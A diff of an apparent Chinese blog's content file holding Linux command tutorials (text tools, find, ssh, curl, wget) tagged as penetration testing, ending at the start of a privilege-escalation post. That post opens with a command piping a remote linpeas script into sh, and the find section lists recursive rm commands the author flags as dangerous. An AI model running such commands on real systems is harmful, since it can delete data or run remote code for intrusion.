+<p>用法：<code>more [选项] [文件]</code></p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">more /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/15.png"></p>
+<h3 id="3-4-less-命令"><a href="#3-4-less-命令" class="headerlink" title="3.4 less 命令"></a>3.4 less 命令</h3><p><code>less</code> 与more类似，用less命令显示文件时，用<code>PageUp</code>键向上翻页，用<code>PageDown</code>键向下翻页。要退出less程序按<code>q</code>键。</p>
+<p>用法：<code>less [选项] [文件]</code></p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-5-head-命令"><a href="#3-5-head-命令" class="headerlink" title="3.5 head 命令"></a>3.5 head 命令</h3><p><code>head</code>命令用于查看文件的开头的内容。在默认情况下，head命令显示文件的头10行内容</p>
+<p>用法：<code>head [选项] [文件]</code></p>
+<p>参数：</p>
+<ul>
+<li>-n&lt;行数&gt; 显示的行数</li>
+</ul>
+<p>案例：显示passwd文件前两行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">head -n 2 /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/16.png"></p>
+<h3 id="3-6-tail-命令"><a href="#3-6-tail-命令" class="headerlink" title="3.6 tail 命令"></a>3.6 tail 命令</h3><p><code>tail</code> 文件中的尾部内容。tail命令默认在屏幕上显示指定文件的末尾10行，如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题</p>
+<p>用法:<code>tail [选项] [文件]</code></p>
+<ul>
+<li>参数：-n&lt;行数&gt; 显示的行数</li>
+</ul>
+<p>案例：查看passwd文件尾部三行内容。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tail -n 3 /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/17.png"></p>
+<ul>
+<li>参数：-f 循环读取</li>
+</ul>
+<p>案例：查看新增的内容</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tail -f /var/<span class="built_in">log</span>/secure</span><br></pre></td></tr></table></figure>
+
+<p><code>/var/log/secure</code>是系统远程登录日志，我们可以通过<code>tail -f</code>命令监控日志变化情况。</p>
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/18.png"></p>
+<p>随后我们另开一个命令终端远程登录此台计算机。</p>
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/19.png"></p>
+<p>可以看到<code>tail -f</code>命令监控到了日志变化。<code>Ctrl+c</code>取消命令。</p>
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/20.png"></p>
+<h3 id="3-7-wc-命令"><a href="#3-7-wc-命令" class="headerlink" title="3.7 wc 命令"></a>3.7 wc 命令</h3><p><code>wc</code>命令用来计算数字。利用wc指令我们可以计算文件的Byte数、字数或是列数。</p>
+<p>用法：<code>wc [选项] [文件]</code></p>
+<p>参数：</p>
+<ul>
+<li>-l 显示行数</li>
+<li>-c 显示Bytes数</li>
+<li>-w 显示字数</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wc -l /etc/passwd</span><br><span class="line">wc -c /etc/passwd</span><br><span class="line">wc -w /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/21.png"></p>
+<h3 id="3-8-du-命令"><a href="#3-8-du-命令" class="headerlink" title="3.8 du 命令"></a>3.8 du 命令</h3><p><code>du</code>命令可查看文件使用空间</p>
+<p>用法：<code>du [选项] [文件]</code></p>
+<p>参数：</p>
+<ul>
+<li>-h 以K，M，G为单位，提高信息的可读性。</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">du -h /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/22.png"></p>
+<h3 id="3-9-df-命令"><a href="#3-9-df-命令" class="headerlink" title="3.9 df 命令"></a>3.9 df 命令</h3><p><code>df</code>命令用于显示磁盘分区上的可使用的磁盘空间。默认显示单位为KB。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。</p>
+<p>用法：<code>df [选项]</code></p>
+<p>参数：</p>
+<ul>
+<li>-h 使用人类可读的格式</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/23.png"></p>
+<h3 id="3-10-diff-命令"><a href="#3-10-diff-命令" class="headerlink" title="3.10 diff 命令"></a>3.10 diff 命令</h3><p><code>diff</code> 命令用于比较文件的差异。</p>
+<p><code>diff</code>以逐行的方式，比较文本文件的异同处。如果指定要比较目录，则 diff 会比较目录中相同文件名的文件，但不会比较其中子目录。</p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diff 1.txt 2.txt</span><br></pre></td></tr></table></figure>
+
+<p>diff命令所参考的不是第一个文件，而是第二个文件，它的输出信息有以下几种字符：</p>
+<p>c: 表示必须做一些修改才能使两个文件相同</p>
+<p>a: 表示必须添加一些内容才能使两个文件相同</p>
+<p>d: 表示必须删除一些内容才能使两个文件相同</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux基础命令-3</title>
+    <url>/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/</url>
+    <content><![CDATA[<h1 id="Linux基础命令（3）"><a href="#Linux基础命令（3）" class="headerlink" title="Linux基础命令（3）"></a>Linux基础命令（3）</h1><h5 id="成殇Orz"><a href="#成殇Orz" class="headerlink" title="成殇Orz"></a>成殇Orz</h5><h3 id="0x01-Linux介绍"><a href="#0x01-Linux介绍" class="headerlink" title="0x01 Linux介绍"></a>0x01 Linux介绍</h3><p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX和Unix的多用户、多任务、支持多线程和多CPU的操作系统。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。</p>
+<span id="more"></span>
+
+<h3 id="0x02-Linux常用命令"><a href="#0x02-Linux常用命令" class="headerlink" title="0x02 Linux常用命令"></a>0x02 Linux常用命令</h3><h4 id="2-1-awk-命令"><a href="#2-1-awk-命令" class="headerlink" title="2.1 awk 命令"></a>2.1 awk 命令</h4><p><code>awk</code>是一种处理文本文件的语言，是一个强大的文本分析工具。</p>
+<p>相比较屏幕处理的优点，<code>awk</code>在处理庞大文件时不会出现内存溢出或是处理缓慢的问题，通常用来格式化文本信息。 <code>awk</code>也是一个非常棒的数据处理工具！相较于<code>sed</code>常常作用于一整个行的处理, <code>awk</code>则比较倾向于一行当中分成数个<code>字段</code>来处理。</p>
+<p><code>awk</code>处理过程: 依次对每一行进行处理，然后输出。</p>
+<p>命令的基本格式是：<code>awk ‘&#123;print($1)&#125;’</code></p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 2.txt|awk <span class="string">&#x27;&#123;print($2)&#125;&#x27;</span>                 <span class="comment">#打印出文本中每行的第二个字段</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/1.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1)&#125;&#x27;</span>  		<span class="comment">#-F指定分隔符，以“：”为分隔符，打印出文本中每行第一个字段</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/2.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1,&quot;+++&quot;,$3)&#125;&#x27;</span>	<span class="comment">#打印出第一个字段与第三个字段，并在其中间添+++内容</span></span><br><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1&quot;+++&quot;$3)&#125;&#x27;</span>     </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/3.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span>       <span class="comment">#打印出文本中每行的最后一个字段</span></span><br><span class="line">cat passwd | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $(NF-1)&#125;&#x27;</span>   <span class="comment">#打印出文本中每行的倒数第二个字段。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/4.png"></p>
+<h4 id="2-2-sed-命令"><a href="#2-2-sed-命令" class="headerlink" title="2.2 sed 命令"></a>2.2 sed 命令</h4><p><code>sed</code> 是stream editor(流编辑器)的简称，是一款强大的,并且有些复杂的程序。</p>
+<p><code>sed</code> 本身是一个管线命令，可以将数据进行替换、删除、新增、提取特定行等功能，主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。sed按行来执行命令。</p>
+<p>拷贝文件<code>cat /etc/passwd &gt; 1.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd | sed <span class="string">&#x27;s/:/+/g&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>s代表搜索，g代表的则是全文。不加g的话则是替换每行第一个出现的。所以这条命令代表的将文件中所有的：替换为+</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/5.png"></p>
+<p><code>cat passwd |sed &#39;s/:/+/3g&#39;</code> #代表的则是从第三次匹配开始替换，依此类推。</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/6.png"></p>
+<p><code>sed -i &#39;s/:/+/g&#39; 1.txt</code> #参数<code>-i</code>,直接修改文件，并非打印出来。</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/7.png"></p>
+<p>以上这些命令中是以/做为该命令的定界符，如果需要修改或者匹配的字段带有/则不能再使用/做为该条命令的定界符，可以使用任意的定界符，不冲突就行。<code>cat passwd |sed &#39;s!:!/!g&#39;</code> 以！号做为定界也是一样的。</p>
+<p>此外，在此命令中，搜索位置使用<code>^</code>代表一行的开头，<code>$</code>代表一行的结尾。<code>sed</code>是以行为单位执行的。</p>
+<p><code>cat ip.txt |sed &#39;s#^#http://#g&#39;</code>在每行之前加上<code>http://</code>。</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/Users\46003\AppData\Roaming\Typora\typora-user-images\image-20220509195350587.png" alt="image-20220509195350587"></p>
+<p><code>cat ip.txt |sed &#39;s#$#:8080#g&#39;</code>在每行末尾加上“:8080”</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/8.png"></p>
+<p><code>sed &#39;/^$/d&#39; 2.txt</code>删除空白的行。</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/9.png"></p>
+<p><code>sed &#39;/^192/&#39;d</code> 删除文件中所有开头是192的行。</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/10.png"></p>
+<h4 id="2-3-grep-命令"><a href="#2-3-grep-命令" class="headerlink" title="2.3 grep 命令"></a>2.3 grep 命令</h4><p>grep这个名字来自于短语“global regular expression print”，所以我们能看出 grep 程序和正则表达式有关联。</p>
+<p>本质上，grep 程序会在文本文件中查找一个指定的正则表达式,并把匹配行输出到标准输出。</p>
+<p>命令格式： <code>grep [options] [pattern]　[filename]</code></p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |grep root                          <span class="comment"># 只显示带有root关键字的行</span></span><br><span class="line">grep -e root passwd                            <span class="comment"># 匹配有root的行</span></span><br><span class="line">grep -v root passwd                            <span class="comment"># 忽略匹配到的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&quot;root|sshd&quot;</span>                <span class="comment"># 包含多个可能性的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&#x27;^r&#x27;</span>                       <span class="comment"># 以r开头的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&#x27;n$&#x27;</span>                       <span class="comment"># 以n结尾的行</span></span><br><span class="line">grep “root” /etc/passwd /etc/shad ow            <span class="comment"># 查询多个文件</span></span><br><span class="line">grep <span class="string">&quot;passwd&quot;</span> /etc -rn                         <span class="comment"># -r 为递归 -n 显示关键字出现在第几行   在多级目录中对文本进行递归查找</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/11.png"></p>
+<h4 id="2-4-find-命令"><a href="#2-4-find-命令" class="headerlink" title="2.4 find 命令"></a>2.4 find 命令</h4><p><code>find</code> 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
+<p>这是一个超级复杂的命令，最简单的模式为：<code>find 路径 -name [名字]</code>。</p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -size 1000k                <span class="comment">#从根目录查找大小为1000K的文件</span></span><br><span class="line">find   -name <span class="string">&#x27;1*&#x27;</span>                 <span class="comment">#在当前目录下查找文件名以1开始的文件</span></span><br><span class="line">find / -name <span class="string">&#x27;1*&#x27;</span>                 <span class="comment">#从根目录查找文件名以1开始的文件</span></span><br><span class="line">find / -user root            	  <span class="comment">#从根目录查找属主为root的文件</span></span><br><span class="line">find / -group root                <span class="comment">#从根目录查找属组为root的文件</span></span><br><span class="line">find /etc -<span class="built_in">type</span> f/d               <span class="comment">#按sock类型查找，f代表文件，d代表目录</span></span><br><span class="line">find . -<span class="built_in">type</span> f -mtime -7          <span class="comment">#搜索7天内当前目录下修改过的文件（-7代表7天内，7代表前7天那一天，+7代表7天前）</span></span><br><span class="line">find . -<span class="built_in">type</span> f -mmin -10          <span class="comment">#搜索10分钟内当前目录下修改过的文件 </span></span><br><span class="line">find . -atime -1 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下一天内被访问的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span></span><br><span class="line">find . -amin -10 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下10分钟内被访问的文件</span></span><br><span class="line">find . -ctime -1 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下一天内状态被改变（列如权限）的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span></span><br><span class="line">find . -cmin -10 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下10分钟内状态被改变的文件</span></span><br><span class="line">find . -perm 777                  <span class="comment">#搜索处当前文件下符合777权限的文件</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>exec选项</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find 搜索路径 [选项] 搜索内容 -<span class="built_in">exec</span> 命令2&#123;&#125;\;</span><br><span class="line">find . -<span class="built_in">type</span> f -perm 644 -<span class="built_in">exec</span> ls -l &#123;&#125; \;</span><br><span class="line">find / -<span class="built_in">exec</span> grep <span class="string">&quot;Hello&quot;</span> &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">find / -name <span class="string">&quot;*.tmp&quot;</span> -<span class="built_in">exec</span> rm -f &#123;&#125; \;           <span class="comment">#(危险)</span></span><br><span class="line">find / -name <span class="string">&quot;*&quot;</span> -ctime +2 -<span class="built_in">exec</span> rm -f &#123;&#125; \;     <span class="comment">#（危险，别敲）</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-5-ag-命令"><a href="#2-5-ag-命令" class="headerlink" title="2.5 ag 命令"></a>2.5 ag 命令</h4><p><code>ag</code>类似<code>grep</code>和<code>find</code>，但是执行效率比后两者高。</p>
+<p>最基本的用法为<code>ag -g &lt;File Name&gt;</code>,从当前目录寻找文件</p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ag -g &lt;File Name&gt;            <span class="comment"># 类似于 find . -name &lt;File Name&gt;</span></span><br><span class="line">ag -i PATTERN                <span class="comment"># 忽略大小写搜索含PATTERN文本</span></span><br><span class="line">ag -A [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并显示匹配内容之后的n行文本，例如：ag -A 5  abc会显示搜索到的包含abc的行以及它之后5行的文本信息。</span></span><br><span class="line">ag -B [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并显示匹配内容之前的n行文本</span></span><br><span class="line">ag -C [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并同时显示匹配内容以及它前后各n行文本的内容。</span></span><br><span class="line">ag --ignore-dir &lt;Dir Name&gt;   <span class="comment">#忽略某些文件目录进行搜索。</span></span><br><span class="line">ag -w PATTERN                <span class="comment">#全匹配搜索，只搜索与所搜内容完全匹配的文本。</span></span><br><span class="line">ag --java PATTERN            <span class="comment">#在java文件中搜索含PATTERN的文本。</span></span><br><span class="line">ag --xml PATTERN             <span class="comment">#在XML文件中搜索含PATTERN的</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-6-stat命令"><a href="#2-6-stat命令" class="headerlink" title="2.6 stat命令"></a>2.6 stat命令</h4><p>用于显示文件信息：</p>
+<p>用法：stat [文件或目录]</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">stat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/12.png"></p>
+<h4 id="2-7-split-命令"><a href="#2-7-split-命令" class="headerlink" title="2.7 split 命令"></a>2.7 split 命令</h4><p><code>split</code>命令可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。</p>
+<p>参数：</p>
+<ul>
+<li>-b 按文件大小进行切割</li>
+<li>-l 按行数来进行切割</li>
+<li>-d 为使用数字为生成文件的后缀</li>
+<li>-a 指定后缀的长度</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">split -b 30k messages    <span class="comment"># 按照每个文件30K大小切割messages文件。</span></span><br><span class="line">split -l 300 messages    <span class="comment"># 将messages文件切割为每3行一份。</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-8-sort命令"><a href="#2-8-sort命令" class="headerlink" title="2.8 sort命令"></a>2.8 sort命令</h4><p><code>sort</code>命令是将文件进行排序，并将排序结果标准输出。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 1.txt|sort            <span class="comment">#默认的排序方式，从首字母开始</span></span><br><span class="line">cat 1.txt|sort -t         <span class="comment">#按照字典进行排序</span></span><br><span class="line">cat 1.txt|sort -n         <span class="comment">#按照数字进行排序</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/13.png"></p>
+<h4 id="2-9-uniq-命令"><a href="#2-9-uniq-命令" class="headerlink" title="2.9 uniq 命令"></a>2.9 uniq 命令</h4><p><code>uniq</code>用于报告或忽略文件中的重复行，一般与sort命令结合使用。</p>
+<p>要注意先排序，后去重。因为uniq命令只能消除相邻且相同的行。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 1.txt |sort -n |uniq              <span class="comment">#排序去重</span></span><br><span class="line">cat 1.txt|sort -n |uniq -c            <span class="comment">#列出重复的次数</span></span><br><span class="line">cat 1.txt |sort -n |uniq -d           <span class="comment">#列出有哪些行是重复的</span></span><br></pre></td></tr></table></figure>
+
+<p>以上系列命令可以用于日志分析：</p>
+<p>如统计IP地址的访问数量并按照数量进行排序： <code>cat access_log |awk &#39;&#123;print($1)&#125;&#39;|sort|uniq -c |sort -nr |more</code></p>
+<p>针对访问量最大的IP分析其访问内容： <code>cat access_log |grep &#39;IP地址&#39;|head -n 100</code></p>
+<h4 id="2-10-nl-命令"><a href="#2-10-nl-命令" class="headerlink" title="2.10. nl 命令"></a>2.10. nl 命令</h4><p><code>nl</code>命令用于显示文件内容行号。</p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd |nl</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-远程连接命令"><a href="#0x03-远程连接命令" class="headerlink" title="0x03 远程连接命令"></a>0x03 远程连接命令</h3><h4 id="3-1-ssh命令"><a href="#3-1-ssh命令" class="headerlink" title="3.1 ssh命令"></a>3.1 ssh命令</h4><p><code>ssh</code>命令是Linux的远程连接工具。</p>
+<p>ssh命令：Linux的远程连接工具</p>
+<p>例如<code>ssh 192.168.2.130</code>，以当前终端用户身份远程连接IP为<code>192.168.2.130</code>的计算机。</p>
+<ul>
+<li>-l 为指定用户 如 <code>ssh -l root 192.168.2.130</code>以root用户远程登录，也可写成<code>ssh root@192.168.0.149</code></li>
+<li>-p 为指定端口号</li>
+</ul>
+<p>执行<code>ssh</code>的默认情况下，会使用本地的用户名连接对方的用户名，例如本地的root连接对面服务器的root，如果两端用户名不一样，则需要使用<code>-l username</code>指定用户名。</p>
+<p>再确认密码后，方能登录成功，而同时变化的文件为：<code>/root/.ssh/known_hosts</code> 在第一次登录时，openssh将会提示不知道这台登录的主机，只要输入<code>yes</code>，就会把这台主机的“识别信息”添加到known_hosts文件中. 第二次登陆后，则无须此步骤，但是如果出现错误，例如主机产生变化，则需要删除<code>/root/.ssh/known_hosts</code>内容。</p>
+<h4 id="3-2-linux下远程连接smb"><a href="#3-2-linux下远程连接smb" class="headerlink" title="3.2 linux下远程连接smb"></a>3.2 linux下远程连接smb</h4><p>Smb服务为网络文件共享协议，它允许应用程序和终端用户从远端的文件服务器访问文件资源 用法：在kali的<code>文件</code>–&gt;<code>其他位置</code>–&gt;<code>连接到服务器</code>处输入：<code>smb://192.168.2.130/share</code></p>
+<h4 id="3-3-rdesktop-命令"><a href="#3-3-rdesktop-命令" class="headerlink" title="3.3 rdesktop 命令"></a>3.3 rdesktop 命令</h4><p><code>rdesktop</code>命令用于在linux下链接windows远程桌面。</p>
+<p>用法：<code>rdesktop 192.168.0.178</code></p>
+<p>关于此部分知识，还将在后续有关windows的章节中详述。</p>
+<h3 id="0x04-URL-相关命令"><a href="#0x04-URL-相关命令" class="headerlink" title="0x04 URL 相关命令"></a>0x04 URL 相关命令</h3><p>URL，既是俗称的网址/网页链接。</p>
+<h4 id="4-1-curl-命令"><a href="#4-1-curl-命令" class="headerlink" title="4.1 curl 命令"></a>4.1 curl 命令</h4><p><code>curl</code>命令是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。</p>
+<p>用法：<code>curl [选项] [url]</code></p>
+<p>参数：</p>
+<ul>
+<li>-i 显示头部信息</li>
+<li>-v 显示请求全过程解析</li>
+<li>-O 下载</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl www.baidu.com</span><br><span class="line">curl www.baidu.com -i</span><br><span class="line">curl www.baidu.com -v</span><br><span class="line">curl -O https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/14.png"></p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/15.png"></p>
+<h4 id="4-2-wget-命令"><a href="#4-2-wget-命令" class="headerlink" title="4.2 wget 命令"></a>4.2 wget 命令</h4><p>wget命令：用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure>
+
+<p>前面我们下载下的文件名都是乱码，所以我们需要给它自定义文件名 加入-O的参数即可指定文件名</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget  https://bootstrap.pypa.io/get-pip.py -O 123.py</span><br></pre></td></tr></table></figure>
+
+<p>如果文件比较大时，加入参数<code>-b</code>，进行后台下载，然后可使用使用<code>tail -f wget-log</code>查看进度。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -751,142 +1093,236 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
       </tags>
   </entry>
   <entry>
-    <title>Linux基础命令-3</title>
-    <url>/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/</url>
-    <content><![CDATA[<h1 id="Linux基础命令（3）"><a href="#Linux基础命令（3）" class="headerlink" title="Linux基础命令（3）"></a>Linux基础命令（3）</h1><h5 id="成殇Orz"><a href="#成殇Orz" class="headerlink" title="成殇Orz"></a>成殇Orz</h5><h3 id="0x01-Linux介绍"><a href="#0x01-Linux介绍" class="headerlink" title="0x01 Linux介绍"></a>0x01 Linux介绍</h3><p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX和Unix的多用户、多任务、支持多线程和多CPU的操作系统。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。</p>
+    <title>Linux提权</title>
+    <url>/2022/09/09/Linux%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><h3 id="0x00-Linux提权信息收集"><a href="#0x00-Linux提权信息收集" class="headerlink" title="0x00 Linux提权信息收集"></a>0x00 Linux提权信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh</span><br></pre></td></tr></table></figure>
+
+<h6 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a>操作系统信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">lsb_release -a</span><br><span class="line">uname –a</span><br><span class="line">uname –mrs</span><br></pre></td></tr></table></figure>
+
 <span id="more"></span>
 
-<h3 id="0x02-Linux常用命令"><a href="#0x02-Linux常用命令" class="headerlink" title="0x02 Linux常用命令"></a>0x02 Linux常用命令</h3><h4 id="2-1-awk-命令"><a href="#2-1-awk-命令" class="headerlink" title="2.1 awk 命令"></a>2.1 awk 命令</h4><p><code>awk</code>是一种处理文本文件的语言，是一个强大的文本分析工具。</p>
-<p>相比较屏幕处理的优点，<code>awk</code>在处理庞大文件时不会出现内存溢出或是处理缓慢的问题，通常用来格式化文本信息。 <code>awk</code>也是一个非常棒的数据处理工具！相较于<code>sed</code>常常作用于一整个行的处理, <code>awk</code>则比较倾向于一行当中分成数个<code>字段</code>来处理。</p>
-<p><code>awk</code>处理过程: 依次对每一行进行处理，然后输出。</p>
-<p>命令的基本格式是：<code>awk ‘&#123;print($1)&#125;’</code></p>
-<p>案例：</p>
